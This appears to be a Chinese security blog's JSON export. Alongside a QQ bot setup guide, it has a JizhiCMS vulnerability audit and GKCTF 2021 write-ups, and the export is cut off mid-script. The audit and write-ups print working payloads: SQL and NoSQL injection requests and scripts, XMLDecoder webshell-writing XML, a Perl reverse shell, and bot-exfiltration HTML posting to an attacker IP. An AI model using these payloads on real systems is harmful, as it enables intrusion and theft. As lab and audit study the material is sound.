{"meta":{"title":"Troy3e","subtitle":null,"description":null,"author":"Troye","url":""},"pages":[{"title":"about","date":"2018-12-12T14:14:36.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"about/index.html","permalink":"/about/index.html","excerpt":"","text":"[さくら荘のhojun] 与&nbsp; Mashiro&nbsp; （ 真（ま）白（しろ） ） 对话中... bot_ui_ini()","keywords":"关于"},{"title":"bangumi","date":"2019-02-10T13:32:48.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"bangumi/index.html","permalink":"/bangumi/index.html","excerpt":"","text":"","keywords":null},{"title":"categories","date":"2019-11-22T03:22:38.000Z","updated":"2019-11-22T03:23:51.477Z","comments":true,"path":"categories/index.html","permalink":"/categories/index.html","excerpt":"","text":""},{"title":"comment","date":"2018-12-20T15:13:48.000Z","updated":"2019-11-16T09:29:49.000Z","comments":true,"path":"comment/index.html","permalink":"/comment/index.html","excerpt":"","text":"念两句诗 叙别梦、扬州一觉。 【宋代】吴文英《夜游宫·人去西楼雁杳》","keywords":"留言板"},{"title":"client","date":"2018-12-20T15:13:35.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"client/index.html","permalink":"/client/index.html","excerpt":"","text":"直接下载 or 扫码下载：","keywords":"Android客户端"},{"title":"donate","date":"2018-12-20T15:13:05.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"donate/index.html","permalink":"/donate/index.html","excerpt":"","text":"","keywords":"谢谢饲主了喵~"},{"title":"lab","date":"2019-01-05T13:47:59.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"lab/index.html","permalink":"/lab/index.html","excerpt":"","text":"sakura主题balabala","keywords":"Lab实验室"},{"title":"music","date":"2018-12-20T15:14:28.000Z","updated":"2020-12-05T14:46:35.710Z","comments":false,"path":"music/index.html","permalink":"/music/index.html","excerpt":"","text":"","keywords":"喜欢的音乐"},{"title":"links","date":"2018-12-19T15:11:06.000Z","updated":"2019-11-16T09:29:49.000Z","comments":true,"path":"links/index.html","permalink":"/links/index.html","excerpt":"","text":"","keywords":"友人帐"},{"title":"photo","date":"2019-11-22T09:24:55.000Z","updated":"2019-11-22T09:24:55.430Z","comments":true,"path":"photo/index.html","permalink":"/photo/index.html","excerpt":"","text":""},{"title":"rss","date":"2018-12-20T15:09:03.000Z","updated":"2019-11-16T09:29:49.000Z","comments":true,"path":"rss/index.html","permalink":"/rss/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-12-12T14:14:16.000Z","updated":"2019-11-16T09:29:49.000Z","comments":true,"path":"tags/index.html","permalink":"/tags/index.html","excerpt":"","text":""},{"title":"theme-sakura","date":"2019-01-04T14:53:25.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"theme-sakura/index.html","permalink":"/theme-sakura/index.html","excerpt":"","text":"Hexo主题Sakura修改自WordPress主题Sakura，感谢原作者Mashiro","keywords":"Hexo 主题 Sakura 🌸"},{"title":"video","date":"2018-12-20T15:14:38.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"video/index.html","permalink":"/video/index.html","excerpt":"","text":"var videos = [ { img: 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: '朝花夕誓——于离别之朝束起约定之花', status: '已追完', progress: 100, jp: 'さよならの朝に約束の花をかざろう', time: '放送时间: 2018-02-24 SUN.', desc: ' 住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。' }, { img : 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: '朝花夕誓——于离别之朝束起约定之花', status: '已追完', progress: 100, jp: 'さよならの朝に約束の花をかざろう', time: '2018-02-24 SUN.', desc: ' 住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。' } ] .should-ellipsis{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:95%;}.should-ellipsis-full{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:100%;}.should-ellipsis i{position:absolute;right:24px;}.grey-text{color:#9e9e9e !important}.grey-text.text-darken-4{color:#212121 !important}html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}img{border-style:none}progress{display:inline-block;vertical-align:baseline}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}html{-webkit-box-sizing:border-box;box-sizing:border-box}*,*:before,*:after{-webkit-box-sizing:inherit;box-sizing:inherit}ul:not(.browser-default){padding-left:0;list-style-type:none}ul:not(.browser-default)>li{list-style-type:none}.card{-webkit-box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2);box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2)}.hoverable{-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s}.hoverable:hover{-webkit-box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19)}i{line-height:inherit}i.right{float:right;margin-left:15px}.bangumi .right{float:right !important}.material-icons{text-rendering:optimizeLegibility;-webkit-font-feature-settings:'liga';-moz-font-feature-settings:'liga';font-feature-settings:'liga'}.row{margin-left:auto;margin-right:auto;margin-bottom:20px}.row:after{content:\"\";display:table;clear:both}.row .col{float:left;-webkit-box-sizing:border-box;box-sizing:border-box;padding:0 .75rem;min-height:1px}.row .col.s12{width:100%;margin-left:auto;left:auto;right:auto}@media only screen and (min-width:601px){.row .col.m6{width:50%;margin-left:auto;left:auto;right:auto}}html{line-height:1.5;font-family:-apple-system,BlinkMacSystemFont,\"Segoe UI\",Roboto,Oxygen-Sans,Ubuntu,Cantarell,\"Helvetica Neue\",sans-serif;font-weight:normal;color:rgba(0,0,0,0.87)}@media only screen and (min-width:0){html{font-size:14px}}@media only screen and (min-width:992px){html{font-size:14.5px}}@media only screen and (min-width:1200px){html{font-size:15px}}.card{position:relative;margin:.5rem 0 1rem 0;background-color:#fff;-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s;border-radius:2px}.card .card-title{font-size:24px;font-weight:300}.card .card-title.activator{cursor:pointer}.card .card-image{position:relative}.card .card-image img{display:block;border-radius:2px 2px 0 0;position:relative;left:0;right:0;top:0;bottom:0;width:100%}.card .card-content{padding:24px;border-radius:0 0 2px 2px}.card .card-content p{margin:0}.card .card-content .card-title{display:block;line-height:32px;margin-bottom:8px}.card .card-content .card-title i{line-height:32px}.card .card-reveal{padding:24px;position:absolute;background-color:#fff;width:100%;overflow-y:auto;left:0;top:100%;height:100%;z-index:3;display:none}.card .card-reveal .card-title{cursor:pointer;display:block}.waves-effect{position:relative;cursor:pointer;display:inline-block;overflow:hidden;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;-webkit-tap-highlight-color:transparent;vertical-align:middle;z-index:1;-webkit-transition:.3s ease-out;transition:.3s ease-out}.waves-effect img{position:relative;z-index:-1}.waves-block{display:block}::-webkit-input-placeholder{color:#d1d1d1}::-moz-placeholder{color:#d1d1d1}:-ms-input-placeholder{color:#d1d1d1}::-ms-input-placeholder{color:#d1d1d1}[type=\"radio\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"radio\"]:not(:checked)+span{position:relative;padding-left:35px;cursor:pointer;display:inline-block;height:25px;line-height:25px;font-size:1rem;-webkit-transition:.28s ease;transition:.28s ease;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border-radius:50%}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border:2px solid #5a5a5a}[type=\"radio\"]:not(:checked)+span:after{-webkit-transform:scale(0);transform:scale(0)}[type=\"checkbox\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"checkbox\"]:not(:checked):disabled+span:not(.lever):before{border:none;background-color:rgba(0,0,0,0.42)}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):before{width:0;height:0;border:3px solid transparent;left:6px;top:10px;-webkit-transform:rotateZ(37deg);transform:rotateZ(37deg);-webkit-transform-origin:100% 100%;transform-origin:100% 100%}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):after{height:20px;width:20px;background-color:transparent;border:2px solid #5a5a5a;top:0px;z-index:0}input[type=checkbox]:not(:disabled) ~ .lever:active:before,input[type=checkbox]:not(:disabled).tabbed:focus ~ .lever::before{-webkit-transform:scale(2.4);transform:scale(2.4);background-color:rgba(0,0,0,0.08)}input[type=range].focused:focus:not(.active)::-webkit-slider-thumb{-webkit-box-shadow:0 0 0 10px rgba(38,166,154,0.26);box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-moz-range-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-ms-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)} 番组计划 这里将是永远的回忆 window.onload = function(){ videos.forEach(function(video, i){ $('#rootRow').append(` ${video.title} ${video.jp} ${video.status} ${video.title} ${video.jp} 放送时间: ${video.time} ${video.desc} ${video.status} `) }) }","keywords":"B站"},{"title":"welfare","date":"2019-11-22T09:25:13.000Z","updated":"2019-11-22T09:25:13.585Z","comments":true,"path":"welfare/index.html","permalink":"/welfare/index.html","excerpt":"","text":""}],"posts":[{"title":"基于nonebot2和go-cqhttp的原神机器人实现及开发","slug":"基于nonebot2和go-cqhttp的原神机器人实现及开发","date":"2021-10-31T02:08:46.000Z","updated":"2021-10-31T03:34:30.597Z","comments":true,"path":"2021/10/31/基于nonebot2和go-cqhttp的原神机器人实现及开发/","link":"","permalink":"/2021/10/31/基于nonebot2和go-cqhttp的原神机器人实现及开发/","excerpt":"","text":"前言这几天又被朋友拉回去玩原神，打了一周终于打的差不多了，可审计和src搞得少了。但也不能不学习啊！所以就搞了个原神bot。摸了，但没完全摸。 搭建项目地址：https://github.com/H-K-Y/Genshin_Impact_bot python3环境首先准备好python&gt;=3.7的版本，并确保pip3（pip指向py3也行）使用没有问题，如下所示： 如果这一部分出现错误，请优先解决。 nonebot2安装1、安装nonebot2及依赖官方给的教程是这样的： 但实际上就2021年10月31日这一天来说，不能这么装。因为pip装的nonebot似乎不是最新的，我在执行的时候一直报错。如果你在后面也遇到import的各种报错，可以参考一下我的解决方案： pip install nb-cli pip uninstall nonebot git clone https://github.com/nonebot/nonebot2.git cd nonebot2 pip install . cd /usr/local/src/python37/lib/python3.7/site-packages //根据你python3的目录修改 ls 如果都装上了，这一步就成功了。如果还会报import的问题，可能是依赖的问题，尝试pip install xx即可。这里还可能会出现一些问题。比如你执行了这样一条命令： pip install nonebot-adapter-cqhttp 它会提示你already satisfied，但是这site-packages下只有nonebot_adapter_cqhttp-2.0.0a16.dist-info而没有nonebot_adapter_cqhttp。于是执行python3 bot.py就会莫名奇妙的报错。 这个问题出现的原因是在之前安装nb-cli时，这个cqhttp适配器被一起装进它的目录了，所以系统找不到（所以这个nb-cli集成在一起真的全是问题，建议分开装）。解决方法为，手动创建nonebot-adapter-cqhttp目录，把/usr/local/src/python37/lib/python3.7/site-packages/nonebot/adapters/cqhttp下的内容复制进来即可。别的东西报错也可以用此方法尝试解决。 2、创建nonebot项目 python3 -m nb_cli，然后选择创建新项目。 [?] Project Name: GS_bot 注：名字，随便填即可 [?] Where to store the plugin? &gt; In a &quot;genshinimpact_bot&quot; folder &gt; In a src folder 注：选择插件放置目录，键盘↑↓选择，回车确认，这里选第二个In a src folder [?] Load Nonebot Builtin Plugin? (y/N) 注：加载Nonebot2内置插件，回车跳过即可 [?] which adapter(s) would you like to use?(Use ↑ and ↓ to move，Space to select，Enter to submit) &gt; ● cqhttp o ding o mirai o feishu 注：上下移动选择框，空格选中，回车确认 3、安装GenshinImpact_Bot cd GS_bot # 刚才创建的目录 git clone -b nonebot2 https://github.com/H-K-Y/Genshin_Impact_bot.git 3、编辑启动文件 vi bot.py 加入如下代码 nonebot.load_plugins(&quot;Genshin_Impact_bot&quot;) go-cqhttp安装及配置1、下载go-cqhttp这里绝对不能下载教程里那个，因为那个老版本不支持扫码登录，现在tx风控严格，只能扫码才能登进去。 找一个目录（最好和上面GS_bot同级，这样操作起来方便） wget https://github.com/Mrs4s/go-cqhttp/releases/download/v1.0.0-beta7-fix2/go-cqhttp_1.0.0-beta7-fix2_linux_amd64.deb dpkg -i go-cqhttp_1.0.0-beta7-fix2_linux_amd64.deb mkdir qq cd qq go-cqhttp 输入数字3，也就是反向连接那个，回车。 2、配置go-cqhttp vi config.hjson 需要修改的数据 account: # 账号相关 uin: 1233456 # QQ账号 password: &#39;密码&#39; # 密码为空时使用扫码登录 servers: - ws-reverse: universal: ws://127.0.0.1:8080/cqhttp/ws 这里我的缩进有点问题，servers那里请参考 格式有一点不对就会报错。注：universal下三个有个重新连接的设置，好像默认是3000，不要修改，如果没有就添上。 试一下能不能运行。我在这里遇到的问题就是time out，一开始以为是反向连接出了问题，后来发现能收到消息，所以不用管他，如果异常退出了再试几次即可。 配置nonebot2找到刚刚nb_cli创建的目录 vi ~/GS_bot/.env.dev 修改 HOST=127.0.0.1 # 配置 NoneBot 监听的 IP/主机名 PORT=8080 # 配置 NoneBot 监听的端口 SUPERUSERS=[&quot;123456&quot;] # 配置 NoneBot 超级用户 NICKNAME=[&quot;bot&quot;, &quot;派蒙&quot;] # 配置机器人的昵称 COMMAND_START=[&quot;/&quot;, &quot;&quot;] # 配置命令起始字符 NICKNAME填写后，发送xxx 操作等同于直接@机器人（例如抽卡功能需要@机器人，而添加nickname之后可以直接发送派蒙 原之井这样来触发命令 运行1、运行go-cqhttp cd ~/qq nohup go-cqhttp &amp; 我这里不是第一次运行所以直接挂了后台，如果你是第一次打开请执行 go-cqhttp 2、运行nonebot2 cd ~/GS_bot nohup python3 bot.py &amp; 至此原神bot已经开始正常运行 测试： 妙啊。命令：https://github.com/H-K-Y/Genshin_Impact_bot/wiki/%E5%91%BD%E4%BB%A4或输入原神帮助 插件开发这个bot目前功能是很有限的，比如不能查询uid。 麻了这个uid看了下每个号每天只能查30次，算了不搞了，反正也是几个朋友用着玩。 自定义的东西过段时间再搞。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"极致CMS漏洞整合与分析","slug":"极致CMS漏洞整合与分析","date":"2021-10-30T09:27:49.000Z","updated":"2021-10-30T09:02:02.379Z","comments":true,"path":"2021/10/30/极致CMS漏洞整合与分析/","link":"","permalink":"/2021/10/30/极致CMS漏洞整合与分析/","excerpt":"","text":"闲来无事，随便找个CMS审一审。 链接：https://github.com/Cherry-toto/jizhicms/releases/ 随缘更新。 前言 若出现页面404的，请设置伪静态：https://www.kancloud.cn/toto/jizhicms/1540682 v1.6.7源码：https://codeload.github.com/Cherry-toto/jizhicms/zip/refs/tags/v1.6.7 一、存储型XSS在发布文章标题插入恶意代码 后台管理员查看内容 相关代码在/Home/c/UserController.php 经过html实体化和转义，看上去不会有什么问题。 但是这里并没有处理title，所以会触发。 二、首页sql注入调试出了点小问题，记录一下解决方案（其实是我之前写的那篇文章有点小问题，希望没人看到。。。）：https://cloud.tencent.com/developer/news/411805 以及调试时超时500的解决方法（需重启web服务）：https://blog.csdn.net/qq_36505844/article/details/105712135 关键代码在HomeController.php的jizhi()里 下个断点跟一下 可以看到我们构造的恶意代码被传入find，继续跟进 FrPHP\\lib\\Model里的find方法 可以看到恶意代码已经被插入 原理如下 最后报错信息通过\\Home\\c\\ErrorController.php下进行输出。 漏洞产生原因：一开始看到这个首页sql注入觉得很奇怪，跟了一遍才发现这个功能原本的目的是匹配页面内容（不知道咋形容），只是没有进行过滤，直接插入数据库执行，导致sql注入。 三、留言界面sql注入 下个断点跟一下 赋值 关键在这里，我们的ip和留言的信息一起传入 最终执行 四、发布文章sql注入这个似乎是beta版本的洞 beta： 正式版： payload POST /user/release.html HTTP/1.1 Host: www.jizhi.com:1238 Content-Length: 221 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://www.jizhi.com:1238 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://www.jizhi.com:1238/user/release.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,ko;q=0.8 Cookie: PHPSESSID=216fp73bnjss25l5tnlqtb5bmt Connection: close id=&amp;isshow=&amp;molds=article&amp;tid=2&#39;and%20extractvalue(1,%20concat(0x5c,%20(select%20database()),0x5c))%20and%20%20&#39;1&#39;=&#39;1&amp;title=1&amp;keywords=1&amp;litpic=&amp;file_litpic=&amp;description=1&amp;submit=%E6%8F%90%E4%BA%A4&amp;body=%3Cp%3E1%3C%2Fp%3E v1.7一、wechat插件sql注入对着Seay的报告审了几个都无果，记得之前看的文章提到wechat部分存在漏洞，于是直接跳到Home/c/WechatController.php。 显然这里url不可控，所以不存在任意文件读取。但是在上下都有一个M函数，find和add似乎是和数据库交互的语句，参数除了包含不可控的user外还有一个openid 往上看可知openid是可控的xml字符串。 注意格式 &lt;?xml version=&#39;1.0&#39;?&gt; &lt;Troy3e&gt; &lt;MsgType&gt;event&lt;/MsgType&gt; &lt;Event&gt;subscribe&lt;/Event&gt; &lt;FromUserName&gt;Troy3e&#39;&lt;/FromUserName&gt; &lt;/Troy3e&gt; 二、安装插件处任意文件上传 首先要知道的是frparam这个函数 所以可知update中filepath、action、download_url等都是可控的。继续往下看，当action传入start-download时： 就是下载download_url的文件，放到tmp_path里，而tmp_path是filepath组成的，所以文件路径也是可控的。但是我们不能直接下载php文件，既是因为不知道是否允许上传php，更重要的是tmp_path强制加了zip后缀。 寻找一下解压的功能 成功上传 路径为：http://www.jizhi.com:1238/A/exts/shell.php 任意文件夹下载也是frparam函数的原因，很简单 后台配置文件删除还是frprarm的问题。。。 只要包含config.php，就会把整个文件夹删除 post path=../../Conf&amp;type=2","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"GKCTF 2021","slug":"GKCTF 2021","date":"2021-10-26T13:20:28.000Z","updated":"2021-10-26T15:44:41.637Z","comments":true,"path":"2021/10/26/GKCTF 2021/","link":"","permalink":"/2021/10/26/GKCTF 2021/","excerpt":"","text":"[GKCTF 2021]babycat只能登录不能注册，看一下js 直接发包注册 upload功能admin only，但是还有个download，抓个包看看能不能任意读 然后不知道读啥了，java不熟，g。查看wp可知路径是这样的/home/download?file=../../WEB-INF/classes/com/web/servlet/registerServlet.class 放到jd-gui里面 箭头1没用，看到替换下意识标了。箭头2匹配”role”:”(.*?)”。非贪婪匹配，只会匹配一次。箭头3将匹配到的role强制转换为guest。 这里由于是json库，并且是gson进行解析，于是可以在 json中使用注释符/**/。用注释符破坏正则的匹配： data={&quot;username&quot;:&quot;test3&quot;,&quot;password&quot;:&quot;test&quot;,&quot;role&quot;:&quot;admin&quot;,&quot;role&quot;/**/:&quot;admin&quot;} 成功admin 我看到官方给的payload是 有点不是很理解为什么匹配的是最后一个。 读取uploadServlet.class 白名单后缀，并且ban了一些执行函数，这让本就不熟java的我原地去世。 非预期然而这里并没有对错误上传的文件进行处理 尝试直接传shell 预期 其中 System.getenv(“CATALINA_HOME”) 可以使用前面的文件包含读取 /proc/self/environ 得到为 /usr/local/tomcat。因此可以尝试将 db.xml 覆盖为恶意代码后使用注册业务触发 XMLDecoder 反序列化。 网上找了执行的xml结构 因为这里有过滤，所以换用hint中提到的 PrintWriter，也可以用实体编码绕过。 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;java class=&quot;java.beans.XMLDecoder&quot;&gt; &lt;object class=&quot;java.io.PrintWriter&quot;&gt; &lt;string&gt;/usr/local/tomcat/webapps/ROOT/static/shell.jsp&lt;/string&gt; &lt;void method=&quot;println&quot;&gt; &lt;string&gt;&lt;![CDATA[冰蝎的载荷]]&gt;&lt;/string&gt; &lt;/void&gt; &lt;void method=&quot;close&quot;/&gt; &lt;/object&gt; &lt;/java&gt; 注销登录触发 [GKCTF 2021]easycms弱口令登陆后台，导出模板处存在任意文件下载。 还有一种解法，是在主题编辑界面处 但是提示 上传组件素材的地方通过修改名称可导致目录穿越创建文件至system目录，因为它的存储路径直接插在名称后面。 在设计-高级那里改模板也是可以的。 [GKCTF 2021]easynode waf部分，将检测到的黑名单内的字符替换为*。但是由于遍历的时候对比的是元素，所以可以用数组绕过。 js利用String和Array绕过一些限制 ：https://www.cnblogs.com/lzc-smiling/p/15161644.html 当然这篇文章说的并不完全正确，因为这里数组转为字符串靠的是加运算。（这也是后面payload最后加*的原因最终username为 [&quot;admin&#39; #&quot;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;*&#39;] payload username[]=admin&#39; #&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=*&amp;password=Troy3e 或者 username[]=admin&#39;#&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=*&amp;username[]=a&amp;password=Troy3e *只要在单引号的位置之后即可。 在adminDIV模块会读取用户的用户名，然后将DIV的键名和值直接导入进去。结合ejs的rce：https://xz.aliyun.com/t/6113 就可以getshell了。 获取 proto用户的 token ，用此 token 去POST data 数据污染 流程：获取admin token -&gt; 添加用户 -&gt; 导入DIV -&gt; 渲染触发。 perl -e &#39;use Socket;$i=&quot;x.x.x.x&quot;;$p=3333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39; [GKCTF 2021]CheckBotbot本地访问admin.php获得flag。根据index.php的提示，bot会访问我们post提交的url。那么也就是说构造一个页面让bot本地访问admin.php并带出flag即可。 &lt;html&gt; &lt;body&gt; &lt;iframe id=&quot;flag&quot; src=&quot;http://127.0.0.1/admin.php&quot;&gt;&lt;/iframe&gt; &lt;script&gt; window.onload = function(){ /* Prepare flag */ let flag = document.getElementById(&quot;flag&quot;).contentWindow.document.getElementById(&quot;flag&quot;).innerHTML; /* Export flag */ var exportFlag = new XMLHttpRequest(); exportFlag.open(&#39;get&#39;, &#39;http://x.x.x.x:3333/flagis-&#39; + window.btoa(flag)); exportFlag.send(); } &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 这个没打出，应该是xmlrequest的问题，换了下面那个 &lt;html&gt; &lt;body&gt; &lt;iframe id=&quot;iframe1&quot; src=&quot;http://127.0.0.1/admin.php&quot;&gt;&lt;/iframe&gt; &lt;script&gt; function load(){ var iframe = document.getElementById(&quot;iframe1&quot;).contentWindow.document.getElementById(&quot;flag&quot;).innerHTML; console.log(iframe); fetch(&#39;http://xxx.xx.xxx.xx:5555&#39;, {method: &#39;POST&#39;, mode: &#39;no-cors&#39;, body: iframe}) } window.onload = load; &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; fetch:https://www.jb51.net/html5/586989.html [GKCTF 2021]hackmenosql注入：https://whoamianony.top/2021/07/30/Web%E5%AE%89%E5%85%A8/Nosql%20%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/ 根据提示nosql 经测试regexp、ne等被ban，用unicode绕过 盲注 import requests import string import time flag = &quot;&quot; url = &quot;http://node4.buuoj.cn:27064/login.php&quot; while True: for i in string.printable: if i not in [&#39;*&#39;, &#39;+&#39;, &#39;.&#39;, &#39;?&#39;, &#39;|&#39;, &#39;#&#39;, &#39;&amp;&#39;, &#39;$&#39;]: data = &quot;&quot;&quot;{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:{&quot;\\\\u0024\\\\u0072\\\\u0065\\\\u0067\\\\u0065\\\\u0078&quot;:&quot;^%s&quot;}}&quot;&quot;&quot; % (flag + i) headers = {&#39;Content-Type&#39;: &#39;application/json&#39;} r = requests.post(url=url,headers=headers,data=data) if &#39;登录了&#39; in r.content.decode(): flag += i print(flag) time.sleep(0.2) 或 import requests import string import time Troy3e = [&#39;0&#39;, &#39;1&#39;,&#39;2&#39;, &#39;3&#39;,&#39;4&#39;, &#39;5&#39;,&#39;6&#39;, &#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c &#39;,&#39;d&#39;, &#39;e&#39;,&#39;f&#39;, &#39;g&#39;,&#39;h&#39;, &#39;i&#39;, &#39;j&#39;,&#39;k&#39;, &#39;l&#39;, &#39;m&#39;,&#39;n&#39;, &#39;o&#39;, &#39;p&#39;,&#39;q&#39;, &#39;r&#39;,&#39;s &#39; , &#39;t&#39;, &#39;u &#39;,&#39;v&#39;, &#39;w&#39;, &#39;x &#39;, &#39;y&#39; ,&#39;z&#39;, &#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;, &#39;O&#39;,&#39;P&#39;, &#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W &#39;,&#39;X &#39;,&#39;Y&#39;,&#39;Z&#39;] flag = &quot;&quot; url = &quot;http://node4.buuoj.cn:27064/login.php&quot; while True: for i in Troy3e: data = &quot;&quot;&quot;{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:{&quot;\\\\u0024\\\\u0072\\\\u0065\\\\u0067\\\\u0065\\\\u0078&quot;:&quot;^%s&quot;}}&quot;&quot;&quot; % (flag + i) headers = {&#39;Content-Type&#39;: &#39;application/json&#39;} r = requests.post(url=url,headers=headers,data=data) if &#39;登录了&#39; in r.content.decode(): flag += i print(flag) time.sleep(0.2) 42276606202db06ad1f29ab6b4a1307f根据提示读nginx配置文件 worker_processes 1; events { worker_connections 1024; } http { include mime.types; default_type application/octet-stream; sendfile on; #tcp_nopush on; #keepalive_timeout 0; keepalive_timeout 65; server { listen 80; error_page 404 404.php; root /usr/local/nginx/html; index index.htm index.html index.php; location ~ \\.php$ { root /usr/local/nginx/html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; } } resolver 127.0.0.11 valid=0s ipv6=off; resolver_timeout 10s; # weblogic server { listen 80; server_name weblogic; location / { proxy_set_header Host $host; set $backend weblogic; proxy_pass http://$backend:7001; } } } fastcgi没有暴露在公网，没法未授权。内网有个weblogic。但是没法SSRF，这时注意到靶机的nginx版本 存在请求走私 后面没复现成，直接拿了现成脚本打 import socket sSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sSocket.connect((&quot;node4.buuoj.cn&quot;, 27064)) payload = b&#39;&#39;&#39;HEAD / HTTP/1.1\\r\\nHost: node4.buuoj.cn\\r\\n\\r\\nGET 